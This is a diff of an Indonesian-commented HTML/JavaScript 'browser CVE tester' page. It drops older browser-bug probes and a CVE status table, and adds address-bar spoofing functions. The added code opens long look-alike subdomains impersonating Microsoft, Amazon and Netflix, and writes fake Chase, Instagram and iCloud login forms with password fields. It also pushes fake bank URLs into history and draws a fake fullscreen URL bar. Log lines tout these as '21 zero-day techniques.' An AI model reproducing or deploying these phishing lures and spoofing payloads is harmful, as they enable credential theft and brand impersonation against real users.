-            log('log_cve3833v8', 'Proxy created. CVE-2024-3833: jika browser crash/hang, kemungkinan besar masih rentan (Chrome <124).');
-        } catch(e) {
-            log('log_cve3833v8', 'Error: ' + e);
-        }
+    
+    // ============ CVE-2026-44659: MICROSOFT BRAND SPOOF ============
+    function cve2026_microsoft() {
+        addLog("🪟 CVE-2026-44659 - Microsoft Brand Spoof", 'cve');
+        const longSub = 'login.microsoftonline.com.secure.verify.account.office365.authentication.please.wait';
+        const url = `https://${longSub}.phishing.net`;
+        updateSimulation(`${longSub.substring(0, 60)}...`, '.phishing.net (Microsoft domain hidden!)');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
     }
-
-    // 7. CVE-2022-3723: Type Confusion in V8
-    function exploit_cve_2022_3723() {
-        log('log_cve3723', '🔥 CVE-2022-3723: Type confusion di V8...');
-        let arr = [1.1, 2.2, 3.3];
-        let obj = {p0: 0};
-        try {
-            // Trigger type confusion via array prototype pollution
-            Array.prototype[0] = 12345;
-            let val = arr[0];
-            log('log_cve3723', `Hasil array[0] = ${val}. Jika terjadi type confusion, bisa menyebabkan heap corruption. Browser versi: Chrome <107.0.5304.87 rentan.`);
-        } catch(e) {
-            log('log_cve3723', 'Exception: ' + e);
-        }
+    
+    // ============ CVE-2026-44659: AMAZON BRAND SPOOF ============
+    function cve2026_amazon() {
+        addLog("📦 CVE-2026-44659 - Amazon Brand Spoof", 'cve');
+        const longSub = 'www.amazon.com.login.verify.account.prime.subscription.renewal.urgent.notice';
+        const url = `https://${longSub}.fake.com`;
+        updateSimulation(`${longSub.substring(0, 60)}...`, '.fake.com (Amazon domain hidden!)');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
     }
-
-    // 8. CVE-2021-30561: Origin Trial Duplicate Property via Proxy
-    function exploit_cve_2021_30561() {
-        log('log_cve30561', '🎭 CVE-2021-30561: mencoba duplicate property via Proxy...');
-        let target = { Exception: 1 };
-        let handler = {
-            getOwnPropertyDescriptor: (target, prop) => {
-                if(prop === 'Exception') return { configurable: true, enumerable: true, value: 2 };
-                return Object.getOwnPropertyDescriptor(target, prop);
-            }
-        };
-        let proxy = new Proxy(target, handler);
-        log('log_cve30561', `Proxy Exception value: ${proxy.Exception}. Jika duplicate property berhasil dibuat, browser Chrome <91 rentan terhadap RCE.`);
+    
+    // ============ CVE-2026-44659: NETFLIX BRAND SPOOF ============
+    function cve2026_netflix() {
+        addLog("🎬 CVE-2026-44659 - Netflix Brand Spoof", 'cve');
+        const longSub = 'www.netflix.com.login.verify.account.payment.update.subscription.expiring';
+        const url = `https://${longSub}.streaming-fake.com`;
+        updateSimulation(`${longSub.substring(0, 60)}...`, '.streaming-fake.com (Netflix hidden!)');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
     }
-
-    // 9. CVE-2024-9393: PDF.js Cross-Origin Access
-    function exploit_cve_2024_9393() {
-        log('log_cve9393', '📑 CVE-2024-9393: mencoba akses PDF cross-origin via resource://pdf.js...');
-        let iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'resource://pdf.js/web/viewer.html?file=https://example.com/test.pdf';
-        document.body.appendChild(iframe);
-        log('log_cve9393', 'Iframe memuat PDF viewer. Jika JS dapat mengakses konten PDF dari domain berbeda, browser Firefox <131 rentan.');
-        setTimeout(() => iframe.remove(), 5000);
+    
+    // ============ CVE-2026-5906: HISTORY PUSHSTATE SPOOF ============
+    function cve2026_historySpoof() {
+        addLog("📜 CVE-2026-5906 - History.pushState Omnibox Spoof", 'cve');
+        const win = window.open('about:blank', '_blank');
+        win.document.write('<h1>Fake Bank Login</h1><input placeholder="Username"><input type="password" placeholder="Password">');
+        win.history.pushState({}, 'Chase', 'https://www.chase.com');
+        win.history.pushState({}, 'Chase', 'https://www.chase.com/secure');
+        updateSimulation("https://www.chase.com/secure", "(history.pushState - CVE-2026-5906)");
+        executedCount++; updateStats();
     }
-
-    // 10. CVE-2024-9394: DevTools Cross-Origin JSON Access
-    function exploit_cve_2024_9394() {
-        log('log_cve9394', '🛠️ CVE-2024-9394: mencoba akses JSON via resource://devtools...');
-        let devtoolsFrame = document.createElement('iframe');
-        devtoolsFrame.style.display = 'none';
-        devtoolsFrame.src = 'resource://devtools/client/jsonview/json-viewer.html';
-        document.body.appendChild(devtoolsFrame);
-        log('log_cve9394', 'Jika JS dapat membaca JSON cross-origin melalui devtools origin, browser rentan.');
-        setTimeout(() => devtoolsFrame.remove(), 5000);
+    
+    // ============ CVE-2026-2378: DELAYED NAVIGATION SPOOF ============
+    function cve2026_delayedNav() {
+        addLog("⏱️ CVE-2026-2378 - Delayed Navigation Spoof", 'cve');
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <body>
+            <h1>Loading secure page...</h1>
+            <script>
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com:8080';
+                    setTimeout(() => {
+                        document.body.innerHTML = '<h1>Instagram Login</h1><input placeholder="Username"><input type="password" placeholder="Password">';
+                    }, 200);
+                }, 1000);
+            <\/script>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(html)}`;
+        updateSimulation("https://www.instagram.com", "(delayed navigation - CVE-2026-2378)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
     }
-
-    // 11. CVE-2024-9398: Protocol Handler Detection
-    function exploit_cve_2024_9398() {
-        log('log_cve9398', '🔍 CVE-2024-9398: mendeteksi aplikasi terinstall via window.open...');
-        let protocols = ['mailto:', 'tel:', 'skype:', 'whatsapp:', 'zoommtg:'];
-        let results = [];
-        protocols.forEach(proto => {
-            let start = Date.now();
-            let win = window.open(proto + 'test', '_blank');
-            let delay = Date.now() - start;
-            if(win && delay < 50) {
-                results.push(proto + ' terdeteksi');
-                win.close();
-            }
-        });
-        log('log_cve9398', `Hasil deteksi: ${results.join(', ') || 'tidak ada yang terdeteksi'}. Jika protocol handler terdeteksi, fingerprinting berhasil.`);
+    
+    // ============ CVE-2025-43327: FULLSCREEN SPOOF ============
+    function cve2025_fullscreen() {
+        addLog("🖥️ CVE-2025-43327 + Fullscreen Spoof", 'cve');
+        const win = window.open('', '_blank');
+        win.document.write(`
+            <style>
+                .fake-bar { position:fixed; top:0; left:0; right:0; background:#2c2c2e; padding:10px; z-index:99999; font-family:monospace; }
+                .fake-url { color:#0f0; background:#1c1c1e; padding:5px 15px; border-radius:20px; display:inline-block; }
+            </style>
+            <div class="fake-bar">🔒 <span class="fake-url">https://www.icloud.com</span></div>
+            <div style="margin-top:60px; padding:20px;"><h1>iCloud</h1><input placeholder="Apple ID"><input type="password" placeholder="Password"></div>
+            <script>document.documentElement.requestFullscreen();<\/script>
+        `);
+        updateSimulation("https://www.icloud.com", "(fullscreen fake bar - CVE-2025-43327)");
+        executedCount++; updateStats();
     }
-
-    // Log startup
-    console.log("%c🔬 Browser CVE Tester Pro - 11 Skenario Siap Diuji", "color: #e94560; font-size: 16px");
-    console.log("Daftar CVE: CVE-2020-3833, CVE-2024-9392, CVE-2024-9391, CVE-2022-454XX, Baidu Spark, CVE-2024-3833, CVE-2022-3723, CVE-2021-30561, CVE-2024-9393, CVE-2024-9394, CVE-2024-9398");
+    
+    // ============ BUILD METHODS ============
+    const methods = [
+        {name: "CVE-2026-44659: Zen Browser Truncation", func: cve2026_44659, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-44659: Brand Impersonation", func: cve2026_44659_brand, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-5906: Chrome Omnibox Spoof", func: cve2026_5906, cve: "CVE-2026-5906", sev: "medium"},
+        {name: "CVE-2026-2378: ArcSearch Spoof", func: cve2026_2378, cve: "CVE-2026-2378", sev: "high"},
+        {name: "CVE-2025-43327: Safari Spoof", func: cve2025_43327, cve: "CVE-2025-43327", sev: "medium"},
+        {name: "CVE-2026-44659: Multiple Dash", func: cve2026_dash, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-44659 + Zero-Width", func: cve2026_zeroWidth, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-5906: iframe Spoof", func: cve2026_5906_iframe, cve: "CVE-2026-5906", sev: "medium"},
+        {name: "CVE-2026-2378: User Interaction", func: cve2026_2378_interaction, cve: "CVE-2026-2378", sev: "high"},
+        {name: "CVE-2025-43327: Malicious Website", func: cve2025_43327_malicious, cve: "CVE-2025-43327", sev: "medium"},
+        {name: "CVE-2026-44659: Extreme 300+ chars", func: cve2026_extreme, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "COMBO: Multiple CVEs", func: cve_combo, cve: "CVE-2026-44659+5906", sev: "critical"},
+        {name: "CVE-2026-2378: iframe Trigger", func: cve2026_iframeTrigger, cve: "CVE-2026-2378", sev: "high"},
+        {name: "CVE-2025-43327 + RTL", func: cve2025_rtl, cve: "CVE-2025-43327", sev: "medium"},
+        {name: "CVE-2026-5906 + Port Block", func: cve2026_portBlock, cve: "CVE-2026-5906", sev: "medium"},
+        {name: "CVE-2026-44659: Microsoft Spoof", func: cve2026_microsoft, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-44659: Amazon Spoof", func: cve2026_amazon, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-44659: Netflix Spoof", func: cve2026_netflix, cve: "CVE-2026-44659", sev: "critical"},
+        {name: "CVE-2026-5906: History Spoof", func: cve2026_historySpoof, cve: "CVE-2026-5906", sev: "medium"},
+        {name: "CVE-2026-2378: Delayed Nav", func: cve2026_delayedNav, cve: "CVE-2026-2378", sev: "high"},
+        {name: "CVE-2025-43327: Fullscreen", func: cve2025_fullscreen, cve: "CVE-2025-43327", sev: "medium"},
+    ];
+    
+    totalMethods = methods.length;
+    statsSpan.innerHTML = `🌀 0/${totalMethods} Techniques`;
+    
+    const grid = document.getElementById('methodGrid');
+    methods.forEach((m, i) => {
+        const card = document.createElement('div');
+        card.className = 'method-card';
+        let sevClass = '';
+        if(m.sev === 'critical') sevClass = 'danger';
+        if(m.sev === 'high') sevClass = 'danger';
+        if(m.sev === 'medium') sevClass = 'medium';
+        card.innerHTML = `
+            <div class="method-title">${(i+1).toString().padStart(2,'0')}. ${m.name}</div>
+            <div class="cve-ref">📌 ${m.cve} | Severity: ${m.sev.toUpperCase()}</div>
+            <div class="method-code">${m.cve} - ${m.name.substring(0, 50)}...</div>
+            <button class="${sevClass}" onclick="${m.func.name}()">🚀 TEST ${m.name}</button>
+        `;
+        grid.appendChild(card);
+    });
+    
+    addLog("✅ 21 zero-day techniques berdasarkan CVE 2026 loaded!", 'success');
+    addLog("💀 CVE-2026-44659: Long subdomain truncation - paling efektif untuk Zen Browser", 'spoof');
+    addLog("💀 CVE-2026-5906: Chrome Omnibox spoof - untuk Android", 'spoof');
+    addLog("💀 CVE-2026-2378: ArcSearch - requires user interaction", 'spoof');
+    addLog("💀 CVE-2025-43327: Safari - fixed in Safari 26", 'spoof');
 </script>
-
-<hr>
-
-<h3>📊 Interpretasi Hasil & Status CVE</h3>
-<table style="width:100%; font-size:12px; border-collapse:collapse;">
-    <tr style="background:#0f3460;"><th>CVE</th><th>Browser Target</th><th>Status di Browser Modern</th></tr>
-    <tr><td>CVE-2020-3833</td><td>Safari (iOS/macOS)</td><td>Patched di Safari 13.0.5+ [citation:8]</td></tr>
-    <tr><td>CVE-2024-9392</td><td>Firefox &lt;131</td><td>Fixed di Firefox 131.0 [citation:9]</td></tr>
-    <tr><td>CVE-2024-9391</td><td>Firefox Focus Android</td><td>Fixed di v131 [citation:9]</td></tr>
-    <tr><td>CVE-2022-454XX</td><td>Firefox &lt;107</td><td>Ditambal November 2022 [citation:5]</td></tr>
-    <tr><td>Baidu Spark</td><td>Baidu Browser 43.23</td><td>Browser legacy, kemungkinan masih rentan [citation:1]</td></tr>
-    <tr><td>CVE-2024-3833</td><td>Chrome &lt;124.0.6367.60</td><td>Fixed April 2024 (RCE di renderer) [citation:3]</td></tr>
-    <tr><td>CVE-2022-3723</td><td>Chrome &lt;107.0.5304.87</td><td>Fixed Oktober 2022 [citation:6]</td></tr>
-    <tr><td>CVE-2021-30561</td><td>Chrome &lt;91</td><td>Bug origin trial - sudah patched [citation:3]</td></tr>
-    <tr><td>CVE-2024-9393</td><td>Firefox &lt;131</td><td>Fixed di Firefox 131 [citation:9]</td></tr>
-    <tr><td>CVE-2024-9394</td><td>Firefox &lt;131</td><td>Fixed di Firefox 131 [citation:9]</td></tr>
-    <tr><td>CVE-2024-9398</td><td>Firefox &lt;131</td><td>Informational - fingerprinting [citation:9]</td></tr>
-</table>
-
-<footer>
-    🔬 Dibuat untuk verifikasi keamanan browser berdasarkan CVE yang sudah dipublikasi.<br>
-    Referensi: NVD, Mozilla Security Advisory (mfsa2024-46), Exploit-DB, GitHub Security Lab, Payatu Blog.<br>
-    <strong>Gunakan hanya untuk pengujian pada perangkat sendiri.</strong>
-</footer>
 </body>
 </html>
